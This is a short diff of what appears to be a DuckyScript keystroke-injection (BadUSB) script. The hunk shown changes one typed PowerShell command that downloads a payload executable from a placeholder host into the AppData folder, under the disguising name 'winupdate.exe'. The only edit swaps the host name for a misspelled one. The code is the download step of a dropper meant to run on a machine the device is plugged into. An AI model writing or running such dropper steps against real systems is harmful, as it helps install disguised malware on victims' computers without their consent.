@@ -15,7 +15,7 @@ ENTER
 DELAY 200
 
 REM Download file (can be .exe, .bat, .vbs, etc.)
-STRING Invoke-WebRequest -Uri "https://example.com/yourpayload.exe" -OutFile "$env:APPDATA\WinUpdate\winupdate.exe"
+STRING Invoke-WebRequest -Uri "https://exaxmple.com/yourpayload.exe" -OutFile "$env:APPDATA\WinUpdate\winupdate.exe"
 ENTER
 DELAY 1500
 
